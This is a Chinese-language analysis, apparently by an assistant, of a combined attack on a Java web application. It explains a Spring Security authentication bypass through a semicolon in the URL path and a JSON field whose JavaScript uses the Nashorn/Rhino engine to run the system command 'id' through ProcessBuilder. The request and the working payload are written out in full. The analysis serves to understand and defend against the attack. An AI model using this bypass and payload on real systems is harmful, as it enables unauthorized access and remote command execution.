## Spring Security 权限绕过 + JS引擎RCE 组合攻击

**是的，这是一个极高危的组合攻击**，包含两个独立的攻击技术叠加使用。

------

### 攻击一：路径混淆绕过权限认证

#### URL 解析

```
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
                               ↑
                         分号路径注入
```

#### 绕过原理

```
Spring Security 看到的路径：
  /dataSetParam/verification;swagger-ui/
  → 按分号截断 → 认为是 /swagger-ui/
  → swagger-ui 通常在白名单（无需认证）
  → 放行请求 ✅

Spring MVC 路由看到的路径：
  /dataSetParam/verification
  → 分号后内容是矩阵参数，忽略
  → 实际执行 /dataSetParam/verification 接口
  → 该接口需要认证，但已被绕过 ✅

攻击者利用两个组件解析路径不一致 → 绕过认证
```

对应漏洞：**CVE-2022-22978 / Spring Security 路径绕过**

### 攻击二：JavaScript引擎执行Java系统命令（RCE）

#### POST Body 解析

json

~~~json
{
  "sampleItem": "1",
  "validationRules": "function verification(data){
    a = new java.lang.ProcessBuilder(\"id\").start().getInputStream();
    r = new java.io.BufferedReader(new java.io.InputStreamReader(a));
    ss = '';
    while((line = r.readLine()) != null){ ss += line };
    return ss;
  }"
}
```

#### 执行链分析
```
服务端接收 validationRules 字段
        ↓
传入 JS 脚本引擎（Nashorn/Rhino）执行
        ↓
JS 引擎调用 Java 原生类（互操作特性）
        ↓
new java.lang.ProcessBuilder("id").start()
        ↓
在服务器上执行系统命令 "id"
        ↓
通过 BufferedReader 读取命令输出
        ↓
return ss → 命令执行结果返回给攻击者
```

#### 为何 JS 能调用 Java 类？
```
Java 内置脚本引擎（JSR-223）：
  Nashorn（JDK 8-14）
  Rhino（早期版本）

特性：JS 代码可直接实例化任意 Java 类
  new java.lang.ProcessBuilder(...)  ← 合法的 Nashorn 语法
  java.io.File / java.net.URL 等均可调用
  
这不是漏洞，而是设计特性被滥用
~~~
